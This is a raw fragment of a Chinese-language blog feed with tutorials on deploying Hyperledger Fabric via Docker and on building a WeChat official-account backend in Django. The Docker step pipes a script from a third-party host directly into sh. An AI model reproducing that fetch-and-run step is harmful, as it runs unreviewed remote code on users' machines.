&#125;,</span><br><span class="line">      &quot;secureContext&quot;: &quot;jim&quot;</span><br><span class="line">  &#125;,</span><br><span class="line">  &quot;id&quot;: 5</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="0x03-参考内容"><a href="#0x03-参考内容" class="headerlink" title="0x03 参考内容"></a>0x03 参考内容</h2><ol><li><a href="https://github.com/hyperledger/fabric" target="_blank" rel="noopener">https://github.com/hyperledger/fabric</a></li><li><a href="https://docs.docker.com/engine/installation/linux/ubuntulinux/" target="_blank" rel="noopener">https://docs.docker.com/engine/installation/linux/ubuntulinux/</a></li><li><a href="https://yeasy.gitbooks.io/docker_practice/content/compose/intro.html" target="_blank" rel="noopener">https://yeasy.gitbooks.io/docker_practice/content/compose/intro.html</a></li><li><a href="https://github.com/hyperledger/fabric/blob/master/docs/Setup/Chaincode-setup.md" target="_blank" rel="noopener">https://github.com/hyperledger/fabric/blob/master/docs/Setup/Chaincode-setup.md</a></li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-说明&quot;&gt;&lt;a href=&quot;#0x00-说明&quot; class=&quot;headerlink&quot; title=&quot;0x00 说明&quot;&gt;&lt;/a&gt;0x00 说明&lt;/h2&gt;&lt;p&gt;作为区块链平台 fabric 项目的代码贡献者，IBM 在自己的 Bluemix 上提供了免费的区块
      
    
    </summary>
    
    
      <category term="Blockchain" scheme="https://g2ex.top/tags/Blockchain/"/>
    
      <category term="Fabric" scheme="https://g2ex.top/tags/Fabric/"/>
    
      <category term="Hyperledger" scheme="https://g2ex.top/tags/Hyperledger/"/>
    
  </entry>
  
  <entry>
    <title>Ubuntu 中使用 Docker 部署 Hyperledger Fabric</title>
    <link href="https://g2ex.top/2016/10/14/Deploy-Hyperledger-Fabric-with-Docker/"/>
    <id>https://g2ex.top/2016/10/14/Deploy-Hyperledger-Fabric-with-Docker/</id>
    <published>2016-10-14T12:00:00.000Z</published>
    <updated>2020-11-25T02:09:19.688Z</updated>
    
    <content type="html"><![CDATA[<p>本文总结如何使用 Docker 部署 Hyperledger 的 fabric。并使用 fabric 的 CLI 接口命令部署链码和进行交易。</p><h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><p>准备一台 Ubuntu 14.04 LTS 主机，规格如下：</p><table><thead><tr><th>Role</th><th>RAM</th><th>Disk</th><th>CPUs</th><th>IP Address</th></tr></thead><tbody><tr><td>hyperledger</td><td>4 GB</td><td>40 GB</td><td>双核</td><td>172.16.1.78</td></tr></tbody></table><p>使用以下命令安装 <code>Docker Engine</code>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt-get install -y python-pip git</span><br><span class="line">$ curl http://files.imaclouds.com/scripts/docker_install.sh | sh</span><br></pre></td></tr></table></figure><p>接下来，使用以下命令安装 <code>docker-compose</code>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ sudo pip install --upgrade pip</span><br><span class="line">$ sudo pip install docker-compose</span><br></pre></td></tr></table></figure><p>注意！如果上述命令安装的 <code>docker-compose</code> 不是最新版，在运行 <code>docker-compose up</code> 命令时会出现错误。可以按照 <a href="https://github.com/docker/compose/releases" target="_blank" rel="noopener">https://github.com/docker/compose/releases</a> 的方法手动安装：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl -L https://github.com/docker/compose/releases/download/1.8.0-rc2/docker-compose-`uname -s`-`uname -m` &gt; /usr/<span class="built_in">local</span>/bin/docker-compose</span><br><span class="line">chmod +x /usr/<span class="built_in">local</span>/bin/docker-compose</span><br></pre></td></tr></table></figure><h2 id="安装-Hyperledger"><a href="#安装-Hyperledger" class="headerlink" title="安装 Hyperledger"></a>安装 Hyperledger</h2><p>安装前首先通过 git 下载 Hyperledger compose：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ git <span class="built_in">clone</span> https://github.com/yeasy/docker-compose-files.git</span><br><span class="line">$ <span class="built_in">cd</span> docker-compose-files/hyperledger</span><br></pre></td></tr></table></figure><p>执行以下步骤来下载 docker 镜像：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ docker pull openblockchain/baseimage:0.0.9</span><br><span class="line">$ docker pull yeasy/hyperledger:latest</span><br><span class="line">$ docker tag yeasy/hyperledger:latest hyperledger/fabric-baseimage:latest</span><br><span class="line">$ docker pull yeasy/hyperledger-peer:noops</span><br><span class="line">$ docker pull yeasy/hyperledger-peer:pbft</span><br><span class="line">$ docker pull yeasy/hyperledger-membersrvc:latest</span><br></pre></td></tr></table></figure><p>执行 <code>docker compose</code> 来部署四个节点的 Hyperledger：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ docker-compose up</span><br><span class="line">Attaching to hyperledger_vp0_1, hyperledger_vp3_1, hyperledger_vp1_1, hyperledger_vp2_1</span><br><span class="line">vp0_1  | 07:42:07.870 [crypto] main -&gt; INFO 001 Log level recognized <span class="string">'info'</span>, <span class="built_in">set</span> to INFO</span><br><span class="line">...</span><br></pre></td></tr></table></figure><h2 id="验证-Hyperledger-peer"><a href="#验证-Hyperledger-peer" class="headerlink" title="验证 Hyperledger peer"></a>验证 Hyperledger peer</h2><p>进入到第一个 Hyperledger 容器：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ docker <span class="built_in">exec</span> -ti hyperledger_vp0_1 bash</span><br></pre></td></tr></table></figure><p>查看目前所有建立的节点：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ peer node status</span><br><span class="line">08:09:14.715 [crypto] main -&gt; INFO 001 Log level recognized <span class="string">'info'</span>, <span class="built_in">set</span> to INFO</span><br><span class="line">08:09:14.715 [logging] LoggingInit -&gt; DEBU 002 Setting default logging level to DEBUG <span class="keyword">for</span> <span class="built_in">command</span> <span class="string">'node'</span></span><br><span class="line">08:09:14.715 [peer] func1 -&gt; INFO 003 Auto detected peer address: 172.17.0.2:30303</span><br><span class="line">08:09:14.716 [peer] func1 -&gt; INFO 004 Auto detected peer address: 172.17.0.2:30303</span><br><span class="line">08:09:14.716 [peer] func1 -&gt; INFO 005 Auto detected peer address: 172.17.0.2:30303</span><br><span class="line">status:STARTED</span><br></pre></td></tr></table></figure><p>进入容器后，首先部署一个链码（chaincode）：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ peer chaincode deploy -p github.com/hyperledger/fabric/examples/chaincode/go/chaincode_example02 \</span><br><span class="line">-c <span class="string">'&#123;"Function":"init", "Args": ["Alice","100", "Bob", "200"]&#125;'</span></span><br><span class="line">...</span><br><span class="line">81a73fa1fabe6e385f3c609cef8915a732ee74179abde55f4ac7addf4e7c35ac4a669a7d9a17b2c9a6b3c28b45565b97dc69f4c8f53381ba13251adf5ac6d23d</span><br></pre></td></tr></table></figure><blockquote><p>上面会获得一个 128 数字字母组成的哈希字符串，该字符串是链码 ID，在后续的交易和查询会使用到。</p></blockquote><p>首先查询 Alice 的账户余额：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ my_key=<span class="string">"81a73fa1fabe6e385f3c609cef8915a732ee74179abde55f4ac7addf4e7c35ac4a669a7d9a17b2c9a6b3c28b45565b97dc69f4c8f53381ba13251adf5ac6d23d"</span></span><br><span class="line">$ peer chaincode query -n <span class="variable">$&#123;my_key&#125;</span> \</span><br><span class="line">-c <span class="string">'&#123;"Function": "query", "Args": ["Alice"]&#125;'</span></span><br><span class="line">...</span><br><span class="line">100</span><br></pre></td></tr></table></figure><p>接着发起一笔交易，让 Alice 支付 10 个单位给 Bob：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ peer chaincode invoke -n <span class="variable">$&#123;my_key&#125;</span> \</span><br><span class="line">-c <span class="string">'&#123;"Function": "invoke", "Args": ["Alice", "Bob", "10"]&#125;'</span></span><br></pre></td></tr></table></figure><p>确认完成交易后，可以查看 Bob 的账户余额：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ peer chaincode query -n <span class="variable">$&#123;my_key&#125;</span> \</span><br><span class="line">-c <span class="string">'&#123;"Function": "query", "Args": ["Bob"]&#125;'</span></span><br></pre></td></tr></table></figure><h2 id="参考内容"><a href="#参考内容" class="headerlink" title="参考内容"></a>参考内容</h2><p><a href="https://yeasy.gitbooks.io/blockchain_guide/content/hyperledger/install.html" target="_blank" rel="noopener">https://yeasy.gitbooks.io/blockchain_guide/content/hyperledger/install.html</a><br><a href="https://github.com/kairen/blockchain-tutorial/blob/master/hyperledger/hyperledger-docker.md" target="_blank" rel="noopener">https://github.com/kairen/blockchain-tutorial/blob/master/hyperledger/hyperledger-docker.md</a><br><a href="https://github.com/docker/compose/releases" target="_blank" rel="noopener">https://github.com/docker/compose/releases</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;本文总结如何使用 Docker 部署 Hyperledger 的 fabric。并使用 fabric 的 CLI 接口命令部署链码和进行交易。&lt;/p&gt;
&lt;h2 id=&quot;准备工作&quot;&gt;&lt;a href=&quot;#准备工作&quot; class=&quot;headerlink&quot; title=&quot;准备工作&quot;
      
    
    </summary>
    
    
      <category term="Blockchain" scheme="https://g2ex.top/tags/Blockchain/"/>
    
      <category term="Fabric" scheme="https://g2ex.top/tags/Fabric/"/>
    
      <category term="Hyperledger" scheme="https://g2ex.top/tags/Hyperledger/"/>
    
      <category term="Docker" scheme="https://g2ex.top/tags/Docker/"/>
    
  </entry>
  
  <entry>
    <title>微信公众平台开发（二）</title>
    <link href="https://g2ex.top/2016/09/28/WeChat-Media-Platform-Development-with-SDK/"/>
    <id>https://g2ex.top/2016/09/28/WeChat-Media-Platform-Development-with-SDK/</id>
    <published>2016-09-28T20:55:00.000Z</published>
    <updated>2020-11-25T02:09:19.688Z</updated>
    
    <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>在上一篇的 <a href="https://g2ex.github.io/2016/09/25/WeChat-Media-Platform-Development-Intro/" target="_blank" rel="noopener">微信公众平台开发（一）</a> 中总结了微信公众平台的接入过程，服务器端使用 Python 的 Django 框架编程实现微信公众平台消息的验证，从中可以了解 Django 的安装过程和公众平台的接入步骤。</p><p>在这一篇中，将总结使用 <code>wechat-python-sdk</code> 进行公众平台的开发过程。<code>wechat-python-sdk</code> 封装了与微信公众平台之间的交互，使得开发者<strong>「可以专注于业务逻辑本身，而不是浪费精力在与微信服务器复杂的交互中」</strong>，目前支持订阅号、服务号的官方接口。</p><p><code>wechat-python-sdk</code> 官网：<a href="http://wechat-python-sdk.com/" target="_blank" rel="noopener">http://wechat-python-sdk.com/</a></p><p>官网中已经对 SDK 有了详细的使用说明，本文的重点是介绍在 Django 中如何使用 <code>wechat-python-sdk</code>，开发一个简单的消息回复程序。</p><h2 id="预备条件"><a href="#预备条件" class="headerlink" title="预备条件"></a>预备条件</h2><h3 id="安装-Django"><a href="#安装-Django" class="headerlink" title="安装 Django"></a>安装 Django</h3><p>安装 Django，主要命令如下，详细过程请参考 <a href="https://g2ex.github.io/2016/09/25/WeChat-Media-Platform-Development-Intro/" target="_blank" rel="noopener">微信公众平台开发（一）</a> 。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt-get install python-pip python-dev</span><br><span class="line"></span><br><span class="line">$ sudo pip install virtualenv     <span class="comment"># 若不使用 virtualenv 可省略</span></span><br><span class="line">$ mkdir Workspace &amp;&amp; <span class="built_in">cd</span> Workspace <span class="comment"># 创建并进入工作目录，可省略</span></span><br><span class="line">$ virtualenv venv                 <span class="comment"># 创建 python 虚拟环境，这里使用默认 Python 版本，也可以使用 -p 参数指定 Python 版本。未使用 virtualenv 请省略此步骤</span></span><br><span class="line">$ <span class="built_in">source</span> ./venv/bin/activate      <span class="comment"># 激活 virtualenv。未使用 Virtualenv 请省略此步骤</span></span><br><span class="line"></span><br><span class="line">$ pip install Django</span><br></pre></td></tr></table></figure><h3 id="安装-wechat-python-sdk"><a href="#安装-wechat-python-sdk" class="headerlink" title="安装 wechat-python-sdk"></a>安装 wechat-python-sdk</h3><p>通过 pip 安装：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ pip install wechat-sdk</span><br></pre></td></tr></table></figure><p>也可以通过 easy_install 或直接下载源码安装，请参考官网安装文档： <a href="http://wechat-python-sdk.com/" target="_blank" rel="noopener">http://wechat-python-sdk.com/</a></p><h2 id="理解-wechat-python-sdk"><a href="#理解-wechat-python-sdk" class="headerlink" title="理解 wechat-python-sdk"></a>理解 wechat-python-sdk</h2><p>对于刚刚接触 SDK 的同学来说，首先应该阅读 <a href="http://wechat-python-sdk.com/quickstart/intro/" target="_blank" rel="noopener">快速上手 - SDK 快速介绍</a>，了解 SDK 的两个主要类：<strong>微信配置类</strong> <code>WechatConf</code>、<strong>官网接口类</strong> <code>WechatBasic</code>。</p><p>接下来阅读 <a href="http://wechat-python-sdk.com/quickstart/official/" target="_blank" rel="noopener">快速上手 - 官方接口</a> 来学习如何使用官方接口进行开发，了解验证如何 <strong>验证服务器请求有效性</strong>、<strong>解析接收到的 XML 消息</strong>、<strong>获取解析后的信息</strong>、<strong>回复消息</strong>。</p><p>至此，基本就可以使用 SDK 进行开发了。</p><h2 id="Django-应用中使用-wechat-python-sdk"><a href="#Django-应用中使用-wechat-python-sdk" class="headerlink" title="Django 应用中使用 wechat-python-sdk"></a>Django 应用中使用 wechat-python-sdk</h2><p>修改 微信公众平台开发（一） 中的 <code>wechat</code> Django 应用，把它改造成使用 <code>wechat-python-sdk</code> 的版本。</p><p>修改 <code>wechat/views.py</code>，导入 <code>wechat_sdk</code>。首先初始化 <code>WechatConf</code> 类传入基本信息。然后在 <code>WeChat()</code> 方法中实例化 <code>WechatBasic</code> 类，使用 <code>check_signature()</code> 验证公众平台发来的消息合法性，使用 <code>parse_data()</code> 提取消息，并用 <code>isinstance()</code> 判断消息类型，使用 <code>response_text()</code> 组装文字消息回复微信用户。</p><p>修改后的文件如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding: utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">reload(sys)</span><br><span class="line">sys.setdefaultencoding(<span class="string">'utf8'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> django.http.response <span class="keyword">import</span> HttpResponse, HttpResponseBadRequest</span><br><span class="line"><span class="keyword">from</span> django.views.decorators.csrf <span class="keyword">import</span> csrf_exempt</span><br><span class="line"><span class="keyword">from</span> wechat_sdk <span class="keyword">import</span> WechatConf</span><br><span class="line"><span class="keyword">from</span> wechat_sdk <span class="keyword">import</span> WechatBasic</span><br><span class="line"><span class="keyword">from</span> wechat_sdk.exceptions <span class="keyword">import</span> ParseError</span><br><span class="line"><span class="keyword">from</span> wechat_sdk.messages <span class="keyword">import</span> (TextMessage, VoiceMessage, ImageMessage, VideoMessage, LinkMessage, LocationMessage, EventMessage, ShortVideoMessage)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 传入基本信息</span></span><br><span class="line">conf = WechatConf(</span><br><span class="line">    token=<span class="string">'your_token'</span>, </span><br><span class="line">    appid=<span class="string">'your_appid'</span>, </span><br><span class="line">    appsecret=<span class="string">'your_appsecret'</span>, </span><br><span class="line">    encrypt_mode=<span class="string">'safe'</span>,  <span class="comment"># 可选项：normal/compatible/safe，分别对应于 明文/兼容/安全 模式</span></span><br><span class="line">    encoding_aes_key=<span class="string">'your_encoding_aes_key'</span>  <span class="comment"># 如果传入此值则必须保证同时传入 token, appid</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="meta">@csrf_exempt</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">WeChat</span><span class="params">(request)</span>:</span></span><br><span class="line">    signature = request.GET.get(<span class="string">'signature'</span>)</span><br><span class="line">    timestamp = request.GET.get(<span class="string">'timestamp'</span>)</span><br><span class="line">    nonce = request.GET.get(<span class="string">'nonce'</span>)</span><br><span class="line">    <span class="comment"># 实例化 WechatBasic 类</span></span><br><span class="line">    wechat_instance = WechatBasic(conf=conf)</span><br><span class="line">    <span class="comment"># 验证微信公众平台的消息</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> wechat_instance.check_signature(signature=signature, timestamp=timestamp, nonce=nonce):</span><br><span class="line">        <span class="keyword">return</span> HttpResponseBadRequest(<span class="string">'Verify Failed'</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> request.method == <span class="string">'GET'</span>:</span><br><span class="line">           response = request.GET.get(<span class="string">'echostr'</span>, <span class="string">'error'</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                wechat_instance.parse_data(request.body)</span><br><span class="line">                message = wechat_instance.get_message()</span><br><span class="line">                <span class="comment"># 判断消息类型</span></span><br><span class="line">                <span class="keyword">if</span> isinstance(message, TextMessage):</span><br><span class="line">                    reply_text = <span class="string">'text'</span></span><br><span class="line">                <span class="keyword">elif</span> isinstance(message, VoiceMessage):</span><br><span class="line">                    reply_text = <span class="string">'voice'</span></span><br><span class="line">                <span class="keyword">elif</span> isinstance(message, ImageMessage):</span><br><span class="line">                    reply_text = <span class="string">'image'</span></span><br><span class="line">                <span class="keyword">elif</span> isinstance(message, LinkMessage):</span><br><span class="line">                    reply_text = <span class="string">'link'</span></span><br><span class="line">                <span class="keyword">elif</span> isinstance(message, LocationMessage):</span><br><span class="line">                    reply_text = <span class="string">'location'</span></span><br><span class="line">                <span class="keyword">elif</span> isinstance(message, VideoMessage):</span><br><span class="line">                    reply_text = <span class="string">'video'</span></span><br><span class="line">                <span class="keyword">elif</span> isinstance(message, ShortVideoMessage):</span><br><span class="line">                    reply_text = <span class="string">'shortvideo'</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    reply_text = <span class="string">'other'</span></span><br><span class="line">                response = wechat_instance.response_text(content=reply_text)</span><br><span class="line">            <span class="keyword">except</span> ParseError:    </span><br><span class="line">                <span class="keyword">return</span> HttpResponseBadRequest(<span class="string">'Invalid XML Data'</span>)</span><br><span class="line">        <span class="keyword">return</span> HttpResponse(response, content_type=<span class="string">"application/xml"</span>)</span><br></pre></td></tr></table></figure><h2 id="项目源码"><a href="#项目源码" class="headerlink" title="项目源码"></a>项目源码</h2><p>源码已托管至 Github <a href="https://github.com/gymgle/Gnotes/tree/master/WeChat/wechat-mp-wechat-python-sdk-demo/mysite" target="_blank" rel="noopener">https://github.com/gymgle/Gnotes/tree/master/WeChat/wechat-mp-wechat-python-sdk-demo/mysite</a></p><h2 id="踩过的坑"><a href="#踩过的坑" class="headerlink" title="踩过的坑"></a>踩过的坑</h2><ol><li><p><strong>安装 wechat-sdk 时出现 <code>error: Setup script exited with error: command &#39;x86_64-linux-gnu-gcc&#39; failed with exit status 1</code></strong><br>因为需要安装 <code>python-dev</code>：</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install python-dev</span><br></pre></td></tr></table></figure><p> 最好在安装 pip 时同时安装 <code>python-dev</code>：</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install python-pip python-dev</span><br></pre></td></tr></table></figure></li></ol><h2 id="参考内容"><a href="#参考内容" class="headerlink" title="参考内容"></a>参考内容</h2><ul><li>wechat-python-sdk 官网 <a href="http://wechat-python-sdk.com/" target="_blank" rel="noopener">http://wechat-python-sdk.com/</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h2&gt;&lt;p&gt;在上一篇的 &lt;a href=&quot;https://g2ex.github.io/2016/09/25/WeChat-Media-Platform
      
    
    </summary>
    
    
      <category term="Python" scheme="https://g2ex.top/tags/Python/"/>
    
      <category term="Django" scheme="https://g2ex.top/tags/Django/"/>
    
      <category term="WeChat" scheme="https://g2ex.top/tags/WeChat/"/>
    
      <category term="Media Platform" scheme="https://g2ex.top/tags/Media-Platform/"/>
    
      <category term="Official Accounts" scheme="https://g2ex.top/tags/Official-Accounts/"/>
    
  </entry>
  
  <entry>
    <title>微信公众平台开发（一）</title>
    <link href="https://g2ex.top/2016/09/25/WeChat-Media-Platform-Development-Intro/"/>
    <id>https://g2ex.top/2016/09/25/WeChat-Media-Platform-Development-Intro/</id>
    <published>2016-09-25T22:45:00.000Z</published>
    <updated>2020-11-25T02:09:19.688Z</updated>
    
    <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>本文总结了使用 <code>Django</code> 开发微信公众号的<strong>后台接入过程</strong>的步骤和经验，主要包括：</p><ol><li>Django 的安装、配置和应用开发，开发和测试环境为 <code>Ubuntu 14.04 LTS</code>；</li><li>公众号后台接入过程，并通过微信公众平台的验证；</li><li>开发过程中遇到的坑和解决方法。</li></ol><p>在后续文章中，会总结基于 <a href="http://wechat-python-sdk.com/" title="wechat-python-sdk" target="_blank" rel="noopener"><code>wechat-python-sdk</code></a> 开发微信公众平台的经验。</p><h2 id="安装-Django"><a href="#安装-Django" class="headerlink" title="安装 Django"></a>安装 Django</h2><h3 id="选择-Python-版本"><a href="#选择-Python-版本" class="headerlink" title="选择 Python 版本"></a>选择 Python 版本</h3><p>根据 Django 版本选择 Python。请注意，代码随 Django 版本不同可能有所变化，如果你想正确运行本文的代码，请确认使用 Django <code>1.10.1</code> 版本。这里使用了 Ubuntu 默认的 Python <code>2.7</code> 版本。</p><table><thead><tr><th>Django version</th><th>Python versions</th></tr></thead><tbody><tr><td>1.8</td><td>2.7, 3.2 (until the end of 2016), 3.3, 3.4, 3.5</td></tr><tr><td>1.9, 1.10</td><td>2.7, 3.4, 3.5</td></tr><tr><td>1.11</td><td>2.7, 3.4, 3.5, 3.6</td></tr><tr><td>2.0</td><td>3.5+</td></tr></tbody></table><h3 id="安装-pip"><a href="#安装-pip" class="headerlink" title="安装 pip"></a>安装 pip</h3><p>这里使用 pip 安装 Django，pip 已经默认安装在了 Python 2 &gt;= 2.7.9 或 Python 3 &gt;= 3.4 中。如果需要安装 pip，可以使用 Ubuntu 包管理器：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt-get install python-pip python-dev</span><br></pre></td></tr></table></figure><h3 id="安装-virtualenv"><a href="#安装-virtualenv" class="headerlink" title="安装 virtualenv"></a>安装 virtualenv</h3><p>virtualenv 使得不同版本的 Python 开发更加方便，如果你不需要 virtualenv，可以跳过该步骤。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo pip install virtualenv</span><br></pre></td></tr></table></figure><h3 id="安装-Django-1"><a href="#安装-Django-1" class="headerlink" title="安装 Django"></a>安装 Django</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ mkdir Workspace &amp;&amp; cd Workspace <span class="comment"># 创建并进入工作目录，可省略</span></span><br><span class="line">$ virtualenv venv                 <span class="comment"># 创建 python 虚拟环境，这里使用默认 Python 版本，也可以使用 -p 参数指定 Python 版本。未使用 virtualenv 请省略此步骤</span></span><br><span class="line">$ source ./venv/bin/activate      <span class="comment"># 激活 virtualenv。未使用 Virtualenv 请省略此步骤</span></span><br><span class="line">$ pip install Django</span><br></pre></td></tr></table></figure><p><strong>PS:</strong> Django 的其他安装方法请参考官方文档：<a href="https://docs.djangoproject.com/en/1.10/intro/install/" target="_blank" rel="noopener">https://docs.djangoproject.com/en/1.10/intro/install/</a></p><h2 id="创建-Django-项目"><a href="#创建-Django-项目" class="headerlink" title="创建 Django 项目"></a>创建 Django 项目</h2><p>创建一个名为 <code>mysite</code> 的 Django 项目：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ django-admin startproject mysite</span><br></pre></td></tr></table></figure><p>测试一下 Django 项目是否能够正常运行：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ cd mysite</span><br><span class="line">$ python manage.py runserver</span><br></pre></td></tr></table></figure><p>正常情况下，会在终端中输出以下内容，打开浏览器访问 <code>http://127.0.0.1:8000/</code> 可以看到 <code>It worked!</code> 运行结果。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">September <span class="number">25</span>, <span class="number">2016</span> - <span class="number">21</span>:<span class="number">09</span>:<span class="number">58</span></span><br><span class="line">Django version <span class="number">1.10</span><span class="number">.1</span>, using settings <span class="string">'mysite.settings'</span></span><br><span class="line">Starting development server at http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">8000</span>/</span><br><span class="line">Quit the server <span class="keyword">with</span> CONTROL-C.</span><br></pre></td></tr></table></figure><p>接下来，按 <code>CONTROL-C</code> 停止 Django 服务，创建 <code>wechat</code> app：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ python manage.py startapp wechat</span><br></pre></td></tr></table></figure><blockquote><p><strong>项目 ( Projects ) vs. 应用 ( apps )</strong><br>项目与应用之间有什么不同之处？应用是一个提供功能的 Web 应用 – 例如：一个博客系统、一个公共记录的数据库或者一个简单的投票系统。 项目是针对一个特定的 Web  网站相关的配置和其应用的组合。一个项目可以包含多个应用。一个应用可以在多个项目中使用。</p></blockquote><h2 id="配置微信公众号开发者模式"><a href="#配置微信公众号开发者模式" class="headerlink" title="配置微信公众号开发者模式"></a>配置微信公众号开发者模式</h2><p>主要注意两点：</p><ol><li>进入微信公众平台，填写服务器配置，在 URL 中填入你的服务器 IP 地址或者域名，这里在 IP 地址后加上 <code>wechat/</code>，在 Django 的应用中去解析 <code>wechat/</code>。注意不要忘记 URL 最后的反斜杠 <code>/</code>，否则 Django 不能正确解析微信的验证信息。</li><li>定义你自己的 <code>Token</code>。</li></ol><p><img src="https://cdn.jsdelivr.net/gh/gymgle/imgur/2016-09-25_195933.webp" alt="微信公众号服务器配置" title="微信公众号服务器配置"></p><p>此时点击「提交」按钮，是无法通过验证的，因为我们还没编写 <code>wechat</code> 应用。</p><h2 id="编写-Django-应用"><a href="#编写-Django-应用" class="headerlink" title="编写 Django 应用"></a>编写 Django 应用</h2><p>在这一节，修改已经创建的 <code>wechat</code> 